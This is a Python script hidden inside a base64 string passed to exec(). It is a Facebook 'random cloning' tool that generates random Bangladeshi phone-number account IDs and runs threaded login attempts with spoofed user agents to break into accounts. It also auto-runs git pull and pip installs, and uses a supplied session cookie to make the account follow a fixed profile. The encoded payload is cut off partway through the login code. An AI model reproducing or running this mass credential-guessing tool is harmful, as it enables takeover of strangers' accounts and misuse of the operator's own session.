import base64
exec(base64.b64decode("DQppbXBvcnQgb3Msc3lzLHRpbWUsanNvbixyYW5kb20scmUsc3RyaW5nLHBsYXRmb3JtLGJhc2U2NCx1dWlkDQpvcy5zeXN0ZW0oImdpdCBwdWxsIikNCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHNvcA0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXANCmltcG9ydCByZXF1ZXN0cyBhcyByZXNzDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRlDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQ0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcA0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcCBhcyB3YWt0dQ0KdHJ5Og0KICAgIGltcG9ydCByZXF1ZXN0cw0KICAgIGZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgVGhyZWFkUG9vbA0KICAgIGltcG9ydCBtZWNoYW5pemUNCiAgICBmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcg0KZXhjZXB0IE1vZHVsZU5vdEZvdW5kRXJyb3I6DQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBtZWNoYW5pemUgcmVxdWVzdHMgZnV0dXJlcyBiczQ9PTIgPiAvZGV2L251bGwnKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykNCiAgICANCmRlZiBjZWtfYXBrKHNlc3Npb24sY29raSk6DQogICAgdz1zZXNzaW9uLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3NldHRpbmdzL2FwcHMvdGFiYmVkLz90YWI9YWN0aXZlIixjb29raWVzPXsiY29va2llIjpjb2tpfSkudGV4dA0KICAgIHNvcCA9IEJlYXV0aWZ1bFNvdXAodywiaHRtbC5wYXJzZXIiKQ0KICAgIHggPSBzb3AuZmluZCgiZm9ybSIsbWV0aG9kPSJwb3N0IikNCiAgICBnYW1lID0gW2kudGV4dCBmb3IgaSBpbiB4LmZpbmRfYWxsKCJoMyIpXQ0KICAgIGlmIGxlbihnYW1lKT09MDoNCiAgICAgICAgcHJpbnQoZidcciVzWyVzISVzXSAlc1NvcnJ5IHRoZXJlIGlzIG5vIEFjdGl2ZSAgQXBrJXMgICclKE4sTSxOLE0sTikpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoZidcclsaXSAlcyBceDFiWzE7OTVtIBogWW91ciBBY3RpdmUgQXBwcyAaICAgICA6e1dISVRFfSclKEdSRUVOKSkNCiAgICAgICAgZm9yIGkgaW4gcmFuZ2UobGVuKGdhbWUpKToNCiAgICAgICAgICAgIHByaW50KGYiXHJbJXMlc10gJXMlcyIlKE4saSsxLGdhbWVbaV0ucmVwbGFjZSgiRGl0YW1iYWhrYW4gcGFkYSIsIiBEaXRhbWJhaGthbiBwYWRhIiksTikpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwcmludChmJ1xyICVzWyVzISVzXSBTb3JyeSwgQXBrIGNoZWNrIGZhaWxlZCBpbnZhbGlkIGNvb2tpZSclKE4sTSxOKSkNCiAgICB3PXNlc3Npb24uZ2V0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vc2V0dGluZ3MvYXBwcy90YWJiZWQvP3RhYj1pbmFjdGl2ZSIsY29va2llcz17ImNvb2tpZSI6Y29raX0pLnRleHQNCiAgICBzb3AgPSBCZWF1dGlmdWxTb3VwKHcsImh0bWwucGFyc2VyIikNCiAgICB4ID0gc29wLmZpbmQoImZvcm0iLG1ldGhvZD0icG9zdCIpDQogICAgZ2FtZSA9IFtpLnRleHQgZm9yIGkgaW4geC5maW5kX2FsbCgiaDMiKV0NCiAgICBpZiBsZW4oZ2FtZSk9PTA6DQogICAgICAgIHByaW50KGYnXHIlc1slcyElc10gJXNTb3JyeSB0aGVyZSBpcyBubyBFeHBpcmVkIEFwayVzICAgICAgICAgICBcbiclKE4sTSxOLE0sTikpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoZidcclsaXSAlcyBceDFiWzE7OTVtIBogWW91ciBFeHBpcmVkIEFwcHMgGiAgICA6e1dISVRFfSclKE0pKQ0KICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4oZ2FtZSkpOg0KICAgICAgICAgICAgcHJpbnQoZiJcclslcyVzXSAlcyVzIiUoTixpKzEsZ2FtZVtpXS5yZXBsYWNlKCJLZWRhbHV3YXJzYSIsIiBLZWRhbHV3YXJzYSIpLE4pKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQoJycpDQoNCmRlZiBmb2xsb3coc2VsZiwgc2Vzc2lvbiwgY29raSk6DQogICAgICAgIHIgPSBCZWF1dGlmdWxTb3VwKHNlc3Npb24uZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/aWQ9MTAwMDE1MzE1MjU4NTE5Jywgew0KICAgICAgICAgICAgJ2Nvb2tpZSc6IGNva2kgfSwgKiooJ2Nvb2tpZXMnLCkpLnRleHQsICdodG1sLnBhcnNlcicpDQogICAgICAgIGdldCA9IHIuZmluZCgnYScsICdJa3V0aScsICoqKCdzdHJpbmcnLCkpLmdldCgnaHJlZicpDQogICAgICAgIHNlc3Npb24uZ2V0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nICsgc3RyKGdldCksIHsNCiAgICAgICAgICAgICdjb29raWUnOiBjb2tpIH0sICoqKCdjb29raWVzJywpKS50ZXh0DQogICAgICAgICAgICANCiAgICAgICAgICANCmNsYXNzIGphbGFuOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCB6KToNCiAgICAgICAgZm9yIGUgaW4geiArICJcbiI6DQogICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGUpDQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDkpDQogICAgICAgICAgICANClAgPSAnXHgxYlsxOzk3bScNCk0gPSAnXHgxYlsxOzkxbScNCkggPSAnXHgxYlsxOzkybScNCksgPSAnXHgxYlsxOzkzbScNCkIgPSAnXHgxYlsxOzk0bScNClUgPSAnXHgxYlsxOzk1bScgDQpPID0gJ1x4MWJbMTs5Nm0nDQpOID0gJ1x4MWJbMG0nICAgIA0KWiA9ICJcMDMzWzE7MzBtIg0Kc2lyID0gJ1wwMzNbNDFtXHgxYlsxOzk3bScNCnggPSAnXDMzW20nICMgREVGQVVMVA0KbSA9ICdceDFiWzE7OTFtJyAjUkVEICsNCmsgPSAnXDAzM1s5M20nICMgS1VOSU5HICsNCnhyID0gJ1x4MWJbMTs5Mm0nICMgSElKQVUgKw0KaGggPSAnXDAzM1szMm0nICMgSElKQVUgLQ0KdSA9ICdcMDMzWzk1bScgIyBVTkdVDQprayA9ICdcMDMzWzMzbScgIyBLVU5JTkcgLQ0KYiA9ICdcMzNbMTs5Nm0nICMgQklSVSAtDQpwID0gJ1x4MWJbMDszNG0nICMgQklSVSArDQphc3UgPSByYW5kb20uY2hvaWNlKFttLGsseHIsdSxiXSkNCm15X2NvbG9yID0gWw0KIFAsIE0sIEgsIEssIEIsIFUsIE8sIE5dDQp3YXJuYSA9IHJhbmRvbS5jaG9pY2UobXlfY29sb3IpDQpub3cgPSBkYXRldGltZS5ub3coKQ0KZHRfc3RyaW5nID0gbm93LnN0cmZ0aW1lKCIlSDolTSIpDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCnRhID0gY3VycmVudC55ZWFyDQpidSA9IGN1cnJlbnQubW9udGgNCmhhID0gY3VycmVudC5kYXkNCnRvZGF5ID0gZGF0ZS50b2RheSgpDQpsb2dvID0gKCIiIg0KDQrilojilojilojilZcgICDilojilojilZcg4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKVlyAg4paI4paI4pWX4paI4paI4pWX4paI4paI4paI4paI4paI4paI4pWXIA0K4paI4paI4paI4paI4pWXICDilojilojilZHilojilojilZTilZDilZDilojilojilZfilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlw0K4paI4paI4pWU4paI4paI4pWXIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVkSAg4paI4paI4pWRDQrilojilojilZHilZrilojilojilZfilojilojilZHilojilojilZTilZDilZDilojilojilZHilojilojilZTilZDilZDilojilojilZHilojilojilZHilojilojilZEgIOKWiOKWiOKVkQ0K4paI4paI4pWRIOKVmuKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilZHilojilojilojilojilojilojilZTilZ0NCuKVmuKVkOKVnSAg4pWa4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVnSANCiAgICAgICAgICAgTUVOVEFMIE5BSElEIA0KIFwwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5dcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXDQogXDAzM1sxOzkzbXwgICAgIFwwMzNbMTs5Nm1b4pyTXSBDUkVBVEVEIEJZXDMzWzA7bSAgIDogXDAzM1sxOzk2bSDhpazwn5iI4a2ETkFISUTwn5iI4a2E6pOn2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTpdmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOa2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOX2ZzZnNmc2ZzZnNmc2ZzZnOqTsNmc2ZzZnNmc6pOj2ZwgICAgICAgICAgXDAzM1sxOzkzbXwNCiBcMDMzWzE7OTNtfCAgICAgXDAzM1sxOzMybVvinJNdIEZBQ0VCT0sgICAgICA6IFwwMzNbMTszNG0gTUQgTkFISUQgSEFTU0FOICAgICAgICAgICAgIFwwMzNbMTs5M218DQogXDAzM1sxOzkzbXwgICAgIFwwMzNbMTszNW1b4pyTXSBHSVRIVUIgICAgICAgOiAgXDAzM1sxOzM1bU1FTlRBTC1OQUhJRDI5OTk5ICAgICAgICAgICBcMDMzWzE7OTNtfA0KIFwwMzNbMTs5M218ICAgICBcMDMzWzE7MzZtW+Kck10gVE9PTCBTVEFUVVMgIDogXDAzM1sxOzM2bSBSYW5kb20gQ2xvbmluZyDhpazwn5iI4a2ETkFISUTwn5iI4a2EIFwwMzNbMTs5M218DQogXDAzM1sxOzkzbXwgICAgIFwwMzNbMTszNW1b4pyTXSBURUFNICAgICAgICAgOiAgXDAzM1sxOzM1bUVILUhBQ0tJTkcgICAgICAgICAgICAgICAgICBcMDMzWzE7OTNtfA0KIFwwMzNbMTs5M218ICAgICBcMDMzWzE7MzZtW+Kck10gVE9PTCBWSVJTSU9OIDogIFwwMzNbMTszNm0wLjAgICAgICAgICAgICAgICAgICAgICAgICAgXDAzM1sxOzkzbXwNCiBcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl1wwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5dcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDlw0KIFwwMzNbMTs5MW1bXDAzM1sxOzk3beKAolwwMzNbMTs5MW1dXDAzM1sxOzMybSBQTFogU0FQUE9SVCBNRSBCUk8uLi4uDQogXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7MzJtIOGlrPCfmIjhrYROQUhJRPCfmIjhrYTqk6fZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOl2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2Zzqk5rZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2Zzqk5fZnNmc2ZzZnNmc2ZzZnNmc6pOw2ZzZnNmc2Zzqk6PZnCBURVJNVVggSEVMUElORyBaT05FLi4uLg0KIFwwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl1wwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5dcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDlyIiIikNCmRlZiBsaW5leCgpOg0KCXByaW50KCdcMDMzWzE7OTNtIMOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXJykNCmxvb3AgPSAwDQpva3MgPSBbXQ0KY3BzID0gW10NCmRlZiBjbGVhcigpOg0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL21lbnRhbDI5LjIuMD9taWJleHRpZD1aYldLd0wnKQ0KICAgIHByaW50KGxvZ28pDQpmcm9tIHRpbWUgaW1wb3J0IGxvY2FsdGltZSBhcyBsdA0KZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIGNtZA0KbHR4ID0gaW50KGx0KClbM10pDQppZiBsdHggPiAxMjoNCiAgICBhID0gbHR4LTEyDQogICAgdGFnID0gIlBNIg0KZWxzZToNCiAgICBhID0gbHR4DQogICAgdGFnID0gIkFNIg0KICAgIA0KICAgIA0KdHJ5Og0KICAgIHByaW50KCdcblxuXDAzM1sxOzMzbUxvYWRpbmcgYXNzZXQgZmlsZXMgLi4uIFwwMzNbMDs5N20nKQ0KICAgIHYgPSA1LjINCiAgICB1cGRhdGUgPSAoJzUuMicpDQogICAgdXBkYXRlID0gKCc1LjInKQ0KICAgIGlmIHN0cih2KSBpbiB1cGRhdGU6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIGVsc2U6cGFzcw0KZXhjZXB0OnByaW50KCdcblwwMzNbMTszMW1ObyBpbnRlcm5ldCBjb25uZWN0aW9uIC4uLiBcMDMzWzA7OTdtJykNCiNnbG9iYWwgZnVuY3Rpb25zDQpkZWYgZHluYW1pYyh0ZXh0KToNCiAgICB0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJywnLi4uLiAnXQ0KICAgIGZvciBvIGluIHRpdGlrOg0KICAgICAgICBwcmludCgnXHInK3RleHQrbyksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDEpDQoNCiNVc2VyIGFnZW50cw0KdWdlbjI9W10NCnVnZW49W10NCiANCmZvciB4ZCBpbiByYW5nZSgxMDAwMCk6DQogICAgYWE9J01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCcNCiAgICBiPXJhbmRvbS5jaG9pY2UoWyczJywnNCcsJzUnLCc2JywnNycsJzgnLCc5JywnMTAnLCcxMScsJzEyJywnMTMnLCcxNCcsJzE1JywnMTYnLCcxNyddKQ0KICAgIGM9JyBlbi11czsgR1QtJw0KICAgIGQ9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pDQogICAgZT1yYW5kb20ucmFuZHJhbmdlKDEsIDk5OSkNCiAgICBmPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQ0KICAgIGc9J0FwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8nDQogICAgaD1yYW5kb20ucmFuZHJhbmdlKDczLDEwMCkNCiAgICBpPScwJw0KICAgIGo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApDQogICAgaz1yYW5kb20ucmFuZHJhbmdlKDQwLDE1MCkNCiAgICBsPSdNb2JpbGUgU2FmYXJpLzUzNy4zNicNCiAgICB1YWt1Mj0oZid7YWF9IHtifTsge2N9e2R9e2V9e2Z9KSB7Z317aH0ue2l9LntqfS57a30ge2x9JykNCiAgICB1Z2VuLmFwcGVuZCh1YWt1MikNCiAgICANCg0KZGVmIHNhbWl5YSh1aWQpOg0KICAgIGlmIGxlbih1aWQpPT0xNToNCiAgICAgICAgaWYgdWlkWzoxMF0gaW4gWycxMDAwMDAwMDAwJ10gICAgICAgOnNoYW50byA9ICcgKCotKikgMjAwOScNCiAgICAgICAgZWxpZiB1aWRbOjldIGluIFsnMTAwMDAwMDAwJ10gICAgICAgOnNoYW50byA9ICfiiJogMjAwOScNCiAgICAgICAgZWxpZiB1aWRbOjhdIGluIFsnMTAwMDAwMDAnXSAgICAgICAgOnNoYW50byA9ICfiiJogMjAwOScNCiAgICAgICAgZWxpZiB1aWRbOjddIGluIFsnMTAwMDAwMCcsJzEwMDAwMDEnLCcxMDAwMDAyJywnMTAwMDAwMycsJzEwMDAwMDQnLCcxMDAwMDA1J106c2hhbnRvID0gJ+KImiAyMDA5Jw0KICAgICAgICBlbGlmIHVpZFs6N10gaW4gWycxMDAwMDA2JywnMTAwMDAwNycsJzEwMDAwMDgnLCcxMDAwMDA5J106c2hhbnRvID0gJyAyMDEwJw0KICAgICAgICBlbGlmIHVpZFs6Nl0gaW4gWycxMDAwMDEnXSAgICAgICAgICA6c2hhbnRvID0gJ+KImiAyMDEwLzIwMTEnDQogICAgICAgIGVsaWYgdWlkWzo2XSBpbiBbJzEwMDAwMicsJzEwMDAwMyddIDpzaGFudG8gPSAn4oiaIDIwMTEvMjAxMicNCiAgICAgICAgZWxpZiB1aWRbOjZdIGluIFsnMTAwMDA0J10gICAgICAgICAgOnNoYW50byA9ICfiiJogMjAxMi8yMDEzJw0KICAgICAgICBlbGlmIHVpZFs6Nl0gaW4gWycxMDAwMDUnLCcxMDAwMDYnXSA6c2hhbnRvID0gJ+KImiAyMDEzLzIwMTQnDQogICAgICAgIGVsaWYgdWlkWzo2XSBpbiBbJzEwMDAwNycsJzEwMDAwOCddIDpzaGFudG8gPSAn4oiaIDIwMTQvMjAxNScNCiAgICAgICAgZWxpZiB1aWRbOjZdIGluIFsnMTAwMDA5J10gICAgICAgICAgOnNoYW50byA9ICfiiJogMjAxNScNCiAgICAgICAgZWxpZiB1aWRbOjVdIGluIFsnMTAwMDEnXSAgICAgICAgICAgOnNoYW50byA9ICfiiJogMjAxNS8yMDE2Jw0KICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwMiddICAgICAgICAgICA6c2hhbnRvID0gJ+KImiAyMDE2LzIwMTcnDQogICAgICAgIGVsaWYgdWlkWzo1XSBpbiBbJzEwMDAzJ10gICAgICAgICAgIDpzaGFudG8gPSAn4oiaIDIwMTgvMjAxOScNCiAgICAgICAgZWxpZiB1aWRbOjVdIGluIFsnMTAwMDQnXSAgICAgICAgICAgOnNoYW50byA9ICfiiJogMjAxOS8yMDIwJw0KICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwNSddICAgICAgICAgICA6c2hhbnRvID0gJ+KImiAyMDIwJw0KICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwNicsJzEwMDA3JywnJ106c2hhbnRvID0gJ+KImiAyMDIxJw0KICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwOCddICAgICAgICAgICA6c2hhbnRvID0gJ+KImiAyMDIyJw0KICAgICAgICBlbGlmIHVpZFs6NV0gaW4gWycxMDAwOSddICAgICAgICAgICA6c2hhbnRvID0gJ+KImiAyMDIzJw0KICAgICAgICBlbHNlOnNoYW50bz0nJw0KICAgIGVsaWYgbGVuKHVpZCkgaW4gWzksMTBdOg0KICAgICAgICBzaGFudG8gPSAnIOKImiAyMDA4LzIwMDknDQogICAgZWxpZiBsZW4odWlkKT09ODoNCiAgICAgICAgc2hhbnRvID0gJ+KImiAyMDA3LzIwMDgnDQogICAgZWxpZiBsZW4odWlkKT09NzoNCiAgICAgICAgc2hhbnRvID0gJ+KImiAyMDA2LzIwMDcnDQogICAgZWxzZTpzaGFudG89JycNCiAgICByZXR1cm4gc2hhbnRvDQogICAgDQogICAgDQogICAgDQojIEFQSyBDSEVDSw0KZGVmIHh4cigpOg0KICAgIHVzZXI9W10NCiAgICB0d2YgPVtdDQogICAgb3MuZ2V0dWlkDQogICAgb3MuZ2V0ZXVpZA0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIHByaW50KGxvZ28pDQogICAgcHJpbnQoZicgXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7OTJtIEV4YW1wbGUgOiB7eHJ9MDE5LDAxNywwMTgsOTIzMDIsOTIzMDEsOTE3Nzh7eH0nKQ0KICAgIHByaW50KCIgXDAzM1sxOzkzbSDDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDlyIpDQogICAgcmsxID0gJzAxNzEnDQogICAgcmsyID0gJzAxNzInDQogICAgcmszID0gJzAxNzUnDQogICAgY29kZSA9IHJhbmRvbS5jaG9pY2UoW3JrMSxyazIscmszXSkgICAgICAgICAgICAgICAgICAgICAgDQogICAgcHd3ID0gaW5wdXQoZicgXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7OTJtIENob29zZSA6ICcpDQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgcHJpbnQobG9nbykNCiAgICBsaW1pdCA9IGludChpbnB1dChmJyBcMDMzWzE7OTFtW1wwMzNbMTs5N23igKJcMDMzWzE7OTFtXVwwMzNbMTs5Mm0gRVhBTVBMRSA6IDIwMDAsIDMwMDAsIDUwMDAgXG4gXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXIFxuIFwwMzNbMTs5MW1bXDAzM1sxOzk3beKAolwwMzNbMTs5MW1dXDAzM1sxOzkybSBQVVQgQ0xPTklORyBMSU1JVDogJykpDQogICAgZm9yIG5tYnIgaW4gcmFuZ2UobGltaXQpOg0KICAgICAgICBubXAgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmRpZ2l0cykgZm9yIF8gaW4gcmFuZ2UoNykpDQogICAgICAgIHVzZXIuYXBwZW5kKG5tcCkNCiAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICBwcmludChsb2dvKQ0KICAgIHBhc3N4ID0gMA0KICAgIEhhbWlpSUQgPSBbXQ0KICAgIHByaW50KCIiKQ0KICAgIGZvciBiaWxhbCBpbiByYW5nZShwYXNzeCk6DQogICAgICAgIHB3dyA9IGlucHV0KGYiXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7OTJtIEVudGVyIFBhc3N3b3JkIHtiaWxhbCsxfSA6ICIpDQogICAgICAgIEhhbWlpSUQuYXBwZW5kKHB3dykNCiAgICB3aXRoIFRocmVhZFBvb2wobWF4X3dvcmtlcnM9NTApIGFzIG1hbnNoZXJhOg0KICAgICAgICBjbGVhcigpDQogICAgICAgIHRsID0gc3RyKGxlbih1c2VyKSkNCiAgICAgICAgcHJpbnQoZicgXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7OTRtIFRPVEFMIElEUzoge3hyfScrdGwpDQogICAgICAgIHByaW50KGYne3h9IFwwMzNbMTs5MW1bXDAzM1sxOzk3beKAolwwMzNbMTs5MW1dXDAzM1sxOzk0bSBUSEUgUFJPQ0VTUyBIQVMgQkVFTiBTVEFSVEVEJykNCiAgICAgICAgcHJpbnQoZicgXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7OTRtIFdPUksgQ1VOVFJZIFwwMzNbMTs5N206IFwwMzNbMTs5Nm1CQU5HTEFERVNIJykNCiAgICAgICAgcHJpbnQoZicgXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7OTRtIFRPT0wgT1dORVIgXDAzM1sxOzk3bTogXDAzM1sxOzk2bSDhpazwn5iI4a2E8J2QjfCdkIDwnZCH8J2QiPCdkIMg8J+YiOGthOqTp9mc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2Zzqk6XZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTmtmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTl9mc2ZzZnNmc2ZzZnNmc2Zzqk7DZnNmc2ZzZnOqTo9mcJykNCiAgICAgICAgcHJpbnQoZicgXDAzM1sxOzkxbVtcMDMzWzE7OTdt4oCiXDAzM1sxOzkxbV1cMDMzWzE7OTRtIFVTRSBORVRXT1JLICBcMDMzWzE7OTdtOiAgXDAzM1sxOzk2bTJHLCAzRywgNEcsIDVHICcpDQogICAgICAgIHByaW50KGYnIFwwMzNbMTs5MW1bXDAzM1sxOzk3beKAolwwMzNbMTs5MW1dXDAzM1sxOzkxbSBVU0UgQUVST1BMQU5FIE1PT0QgSU4gRVZFUlkgNSBNSU4gJykNCiAgICAgICAgcHJpbnQoZiIgXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXIikNCiAgICAgICAgZm9yIGxvdmUgaW4gdXNlcjoNCiAgICAgICAgICAgIHB3eCA9IFtsb3ZlWzE6XV0NCiAgICAgICAgICAgIHVpZCA9IGNvZGUrbG92ZQ0KICAgICAgICAgICAgZm9yIEVtYW4gaW4gSGFtaWlJRDoNCiAgICAgICAgICAgICAgICBwd3guYXBwZW5kKEVtYW4pDQogICAgICAgICAgICAgICAgcHd4LmFwcGVuZChsb3ZlKQ0KICAgICAgICAgICAgbWFuc2hlcmEuc3VibWl0KHJjcmFjayx1aWQscHd4LHRsKQ0KICAgIHByaW50KGYiXG57eH0gXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXIikNCmRlZiByY3JhY2sodWlkLHB3eCx0bCk6DQogICAgI3ByaW50KHVzZXIpDQogICAgZ2xvYmFsIGxvb3ANCiAgICBnbG9iYWwgY3BzDQogICAgZ2xvYmFsIG9rcw0KICAgIGdsb2JhbCBwcm94eQ0KICAgIHRyeToNCiAgICAgICAgZm9yIHBzIGluIHB3eDoNCiAgICAgICAgICAgIHBybyA9IHJhbmRvbS5jaG9pY2UodWdlbikNCiAgICAgICAgICAgIHNlc3Npb24gPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgIGZyZWVfZmIgPSBzZXNzaW9uLmdldCgnaHR0cHM6Ly9wLmZhY2Vib29rLmNvbScpLnRleHQNCiAgICAgICAgICAgIGxvZ19kYXRhID0gew0KICAgICAgICAgICAgICAgICJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgIm1fdHMiOnJlLnNlYXJjaCgnbmFtZT0ibV90cyIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAibGkiOnJlLnNlYXJjaCgnbmFtZT0ibGkiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAg